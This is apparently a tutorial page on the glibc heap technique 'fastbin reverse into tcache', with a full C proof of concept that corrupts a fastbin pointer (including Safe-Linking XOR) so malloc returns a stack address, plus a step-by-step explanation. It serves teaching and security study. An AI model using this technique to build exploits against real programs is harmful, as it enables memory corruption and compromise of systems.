#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "Fastbin Reverse into Tcache",
    description: "Abusing the fastbin-to-tcache refill mechanism to achieve an arbitrary allocation or write a heap pointer to a target location.",
    date: "2025-12-28",
    order: 26,
  ),
)<frontmatter>

= Fastbin Reverse into Tcache

== Introduction

This attack exploits the mechanism in glibc where the tcache is refilled from the fastbins. When the tcache for a particular size is empty and a `malloc` request for that size is made, glibc may refill the tcache by pulling chunks from the corresponding fastbin.

Crucially, the chunks are pulled from the fastbin and pushed into the tcache. Since both are LIFO (Last-In First-Out) structures, but the refill process iterates through the fastbin and pushes each chunk onto the tcache, the order of chunks is reversed. By corrupting a `fd` pointer in the fastbin, an attacker can trick this refill logic into "stashing" an arbitrary address into the tcache.

== Prerequisites
- *Heap Leak (glibc 2.32+)*: Due to Safe-Linking, the fastbin `fd` pointer must be XORed with its own address.
- *Write Primitive*: Ability to overwrite the `fd` pointer of a chunk in the fastbin (e.g., via UAF or Heap Overflow).
- *Tcache Control*: Ability to fill and then empty the tcache for a specific size.

== Example from `fastbin_reverse_into_tcache.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

const size_t allocsize = 0x40;

int main(){
	setbuf(stdout, NULL);

	printf("\n"
		   "This attack is intended to have a similar effect to the unsorted_bin_attack,\n"
		   "except it works with a small allocation size (allocsize <= 0x78).\n"
		   "The goal is to set things up so that a call to malloc(allocsize) will write\n"
		   "a large unsigned value to the stack.\n\n");
	printf("After the patch https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,\n"
		   "An heap address leak is needed to perform this attack.\n"
		   "The same patch also ensures the chunk returned by tcache is properly aligned.\n\n");

	// Allocate 14 times so that we can free later.
	char* ptrs[14];
	size_t i;
	for (i = 0; i < 14; i++) {
		ptrs[i] = malloc(allocsize);
	}
	
	printf("First we need to free(allocsize) at least 7 times to fill the tcache.\n"
	  	   "(More than 7 times works fine too.)\n\n");
	
	// Fill the tcache.
	for (i = 0; i < 7; i++) free(ptrs[i]);
	
	char* victim = ptrs[7];
	printf("The next pointer that we free is the chunk that we're going to corrupt: %p\n"
		   "It doesn't matter if we corrupt it now or later. Because the tcache is\n"
		   "already full, it will go in the fastbin.\n\n", victim);
	free(victim);
	
	printf("Next we need to free between 1 and 6 more pointers. These will also go\n"
		   "in the fastbin. If the stack address that we want to overwrite is not zero\n"
		   "then we need to free exactly 6 more pointers, otherwise the attack will\n"
		   "cause a segmentation fault. But if the value on the stack is zero then\n"
		   "a single free is sufficient.\n\n");
	
	// Fill the fastbin.
	for (i = 8; i < 14; i++) free(ptrs[i]);
	
	// Create an array on the stack and initialize it with garbage.
	size_t stack_var[6];
	memset(stack_var, 0xcd, sizeof(stack_var));
	
	printf("The stack address that we intend to target: %p\n"
		   "It's current value is %p\n", &stack_var[2], (char*)stack_var[2]);
	
	printf("Now we use a vulnerability such as a buffer overflow or a use-after-free\n"
			"to overwrite the next pointer at address %p\n\n", victim);
	
	//------------VULNERABILITY-----------
	
	// Overwrite linked list pointer in victim.
	// The following operation assumes the address of victim is known, thus requiring
	// a heap leak.
	*(size_t**)victim = (size_t*)((long)&stack_var[0] ^ ((long)victim >> 12));
	
	//------------------------------------
	
	printf("The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n");
	
	// Empty tcache.
	for (i = 0; i < 7; i++) ptrs[i] = malloc(allocsize);
	
	printf("Let's just print the contents of our array on the stack now,\n"
			"to show that it hasn't been modified yet.\n\n");
	
	for (i = 0; i < 6; i++) printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
	
	printf("\n"
		   "The next allocation triggers the stack to be overwritten. The tcache\n"
		   "is empty, but the fastbin isn't, so the next allocation comes from the\n"
		   "fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n"
		   "Those 7 chunks are copied in reverse order into the tcache, so the stack\n"
		   "address that we are targeting ends up being the first chunk in the tcache.\n"
		   "It contains a pointer to the next chunk in the list, which is why a heap\n"
		   "pointer is written to the stack.\n"
		   "\n"
		   "Earlier we said that the attack will also work if we free fewer than 6\n"
		   "extra pointers to the fastbin, but only if the value on the stack is zero.\n"
		   "That's because the value on the stack is treated as a next pointer in the\n"
		   "linked list and it will trigger a crash if it isn't a valid pointer or null.\n"
		   "\n"
		   "The contents of our array on the stack now look like this:\n\n");
	
	malloc(allocsize);
	
	for (i = 0; i < 6; i++) printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
	
	char *q = malloc(allocsize);
	printf("\n"
			"Finally, if we malloc one more time then we get the stack address back: %p\n", q);
	
	assert(q == (char *)&stack_var[2]);
	
	return 0;
}
```

== Attack Flow Explained

=== 1. Filling Tcache and Fastbin

First, we allocate several chunks. We free 7 of them to fill the tcache for that size. Then, we free the `victim` chunk and several others. Since the tcache is full, these chunks go into the fastbin.

The fastbin list looks like this (LIFO):
`HEAD -> ptrs[13] -> ptrs[12] -> ... -> victim -> NULL`

=== 2. Corrupting the Fastbin Pointer

We use a vulnerability to overwrite the `fd` pointer of the `victim` chunk. We point it to a location we want to control (minus the header size), such as a stack address. In glibc 2.32+, we must account for Safe-Linking.

```c
*(size_t**)victim = (size_t*)((long)&stack_var[0] ^ ((long)victim >> 12));
```

The fastbin list is now:
`HEAD -> ptrs[13] -> ... -> victim -> &stack_var[0]`

=== 3. Emptying Tcache and Triggering Refill

We allocate 7 times to empty the tcache. The next `malloc` request finds the tcache empty and looks at the fastbin.

glibc takes the head of the fastbin (`ptrs[13]`) to satisfy the current `malloc` request. It then notices the tcache is empty and tries to refill it using the remaining chunks in the fastbin (up to 7).

=== 4. Reverse Refill Mechanism

The refill logic iterates through the fastbin and pushes each chunk onto the tcache:
1. `ptrs[12]` is pushed to tcache.
2. ...
3. `victim` is pushed to tcache.
4. `&stack_var[0]` (the corrupted pointer) is pushed to tcache.

Because tcache is also a LIFO, the *last* thing pushed becomes the *head*. So the tcache head now points to our target address.

=== 5. Result

The stashing process writes the address of the *next* chunk in the list to the `fd` field of the current chunk. When it stashes our target address, it writes a heap pointer (the address of the chunk that was previously at the head) into the target location.

Finally, the next `malloc` call returns the pointer to our target address (`&stack_var[2]`).

```